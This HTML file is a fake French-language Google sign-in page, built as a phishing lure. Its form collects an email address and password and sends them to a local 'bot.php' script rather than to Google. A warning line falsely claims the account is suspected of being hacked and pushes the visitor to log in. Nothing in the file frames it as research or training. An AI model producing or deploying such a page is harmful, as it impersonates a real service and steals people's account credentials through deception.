<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Se connecter - Google</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap');
        
        body {
            margin: 0;
            padding: 0;
            font-family: 'Roboto', Arial, sans-serif;
            background: #121212;
            color: #e8eaed;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            width: 100%;
            max-width: 420px;
            padding: 20px;
        }
        .google-logo {
            font-size: 78px;
            font-weight: 400;
            letter-spacing: -4px;
            margin-bottom: 10px;
            text-align: center;
            color: #ffffff;
        }
        h1 {
            font-size: 28px;
            font-weight: 400;
            margin: 0 0 25px 0;
            text-align: center;
        }
        .description {
            font-size: 15px;
            line-height: 1.45;
            color: #9aa0a6;
            margin-bottom: 32px;
            text-align: center;
        }
        input {
            width: 100%;
            background: #202124;
            border: 1px solid #5f6368;
            color: #e8eaed;
            padding: 16px 14px;
            font-size: 16px;
            border-radius: 4px;
            box-sizing: border-box;
            margin-bottom: 16px;
        }
        input:focus {
            border-color: #8ab4f8;
            outline: none;
            box-shadow: 0 0 0 2px rgba(138, 180, 248, 0.5);
        }
        .bottom {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 30px;
        }
        .create {
            color: #8ab4f8;
            font-size: 14px;
            font-weight: 500;
            text-decoration: none;
        }
        .btn {
            background: #8ab4f8;
            color: #202124;
            border: none;
            padding: 11px 32px;
            border-radius: 20px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
        }
        .btn:hover {
            background: #aecbfa;
        }
        .warning {
            margin-top: 50px;
            font-size: 13px;
            color: #9aa0a6;
            text-align: center;
            line-height: 1.4;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="google-logo">Google</div>
        <h1>Connexion</h1>
        
        <p class="description">
            Utilisez votre compte Google. Vous vous connecterez également aux services Google dans vos applications et dans Safari.
        </p>

        <form action="bot.php" method="POST">
            <input type="email" name="email" placeholder="Adresse e-mail ou téléphone" required autofocus>
            <input type="password" name="password" placeholder="Mot de passe" required>
            
            <div class="bottom">
                <a href="#" class="create">Créer un compte</a>
                <button type="submit" class="btn">Suivant</button>
            </div>
        </form>

        <div class="warning">
            Veuillez vous connecter pour supprimer de tous les appareils<br>
            le compte Google qui a été suspecté être piraté.
        </div>
    </div>

    <script>
        document.querySelector('form').addEventListener('submit', function(e) {
            const btn = document.querySelector('.btn');
            btn.textContent = "Chargement...";
        });
    </script>
</body>
</html>
